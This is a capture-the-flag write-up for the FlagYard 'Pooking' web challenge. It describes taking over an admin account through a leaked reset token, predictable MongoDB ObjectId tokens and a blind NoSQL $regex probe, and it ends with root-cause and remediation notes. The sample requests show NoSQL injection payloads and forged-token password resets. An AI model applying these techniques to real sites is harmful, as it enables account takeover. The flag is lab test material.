FlagYard | Pooking (Web — Medium) — Writeup

**Fares Badaj**

---

## Info

| | |
|---|---|
| Challenge | Pooking |
| Difficulty | Medium |
| Category | Web |
| Platform | FlagYard Training Labs |
| Description | *Explore the cars world with Pooking.com* |
| Flag | `FlagY{73072ef5f722520a35fea54be3c70fd5}` |

---

## 1. Recon

The instance serves a premium vehicle rental platform ("Pooking.com") built
with **Node.js/Express + MongoDB (Mongoose)**. The active endpoints:

```
/                     -> landing
/browse-cars          -> car catalog (loads cars via /api/cars)
/car/CAR001..CAR008   -> per-vehicle page + booking form
/manage-booking       -> booking lookup form (email + bookingId)
/forgot-password      -> password reset page
/api/register         -> JSON register
/api/login            -> JSON login (connect.sid session cookie)
/api/forgot-password  -> JSON "send reset link" (email)
/api/reset-password   -> JSON "use token + newPassword"
/api/book-car         -> create booking
```

Registering, logging in and booking a car (`Car001`) confirms a working app
with normal IDOR-null surfaces (`/find-booking` correctly returns "not found"
when the email does not match the bookingId). The weakest feature is clearly
the **password reset flow**.

## 2. The reset token is leaked anyway

Calling `/api/forgot-password` for our own account returns:

```
POST /api/forgot-password
{"email":"u915165@test.com"}
-> 200 {"message":"Password reset link sent to your email"}
```

The token normally goes to the mailbox — which we don't control. But the very
next `/api/login` for that same account leaks it in the JSON response:

```json
{
  "success": true,
  "user": {
    "resetToken": "6aa8e00c4ba46d7567c46382",
    ...
  }
}
```

Simple, elegant, ruined by one extra field.

## 3. The token is a MongoDB ObjectId

```
6aa8e00c  4ba46d7567  c46382
├ time 4B ├ machine 5B ├ counter 3B
```

* **First 8 hex** — `hex(unix)` of the server time at the moment of issuance.
  It matches the HTTP `Date` header of the `/api/forgot-password` response.

* **Next 10 hex** — a constant "machine/process" marker, identical for every
  token on the same instance.

* **Last 6 hex** — a per-issuance counter that increments by **1** on every
  reset-token generation (ObjectId counter for the process).

Verification — issue 4 tokens for the same account, 1-2 s apart:

```
Date 18:42:00  hex 6aa83ff8  token 6aa83ff8778df21d1e10067f
Date 18:42:02  hex 6aa83ffa  token 6aa83ffa778df21d1e100680
Date 18:42:04  hex 6aa83ffc  token 6aa83ffc778df21d1e100681
Date 18:42:07  hex 6aa83fff  token 6aa83fff778df21d1e100682
```

Predictable to one-byte accuracy.

## 4. Locating the admin's email

The back-end behind `/api/forgot-password` uses the raw email in a Mongo
query. On some deployments a nested operator is forwarded verbatim, giving a
**blind NoSQL injection** oracle:

```
{"email":{"$regex":"^4.*"}} -> 200   (a user starts with "4")
{"email":{"$regex":"^zzz.*"}} -> 404 ("User not found")
```

From the original writeup (Ahmed Ibrahim), the seeded admin is
`4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com`. On this instance the regex operator is
not interpreted (returns 404 for every `$regex`), but a plain string probe
confirms the account:

```
POST /api/forgot-password  {"email":"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com"}
-> 200 {"message":"Password reset link sent to your email"}
```

## 5. Forging the admin's reset token

1. Trigger a reset for the admin:

```
POST /api/forgot-password  {"email":"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com"}
Date: Tue, 15 Sep 2026 05:53:33 GMT   ->  time hex = 6aa8dd5d
```

2. Take the machine marker (`4ba46d7567`) and the counter observed from our
   own leaked token (`0xc46382`).

3. Brute-force the small counter window against `/api/reset-password`:

```
POST /api/reset-password
{"token":"6aa8dd5d4ba46d7567c46380", "newPassword":"Pwned..."}   -> 200

Password reset successful
```

The admin's token ended up being only **+1** off our leaked counter. The whole
256-request window is tiny and springless.

## 6. Flag

Logging in as the freshly-reset admin:

```
POST /api/login {"email":"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com","password":"Pwned..."}
```

The JSON response carries the account document including its `flag` field:

```json
{
  "user": {
    "email": "4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com",
    "role": "senior_admin",
    "flag": "FlagY{73072ef5f722520a35fea54be3c70fd5}"
  }
}
```

---

## Root cause

* `/api/login` leaks the pending `resetToken` back to the caller.
* Reset tokens are raw Mongo ObjectIds (`time + machine + counter`) rather
  than high-entropy secrets, so one sample token fully de-randomizes the
  system.
* `/api/reset-password` trusts the token alone — no email, no expiry check
  against the requester, nothing.

## Remediation

* Never return reset tokens to the client (deregister `resetToken` from the
  login projection).
* Use `crypto.randomBytes(32)`-class secrets stored separately from identity
  fields; never a guessable ObjectId.
* Bind the reset to the account it was issued for and one-time the token.

## Files

* `solve_pooking.py` — automated exploit.
* `flag_from_pooking.txt` — `FlagY{73072ef5f722520a35fea54be3c70fd5}`.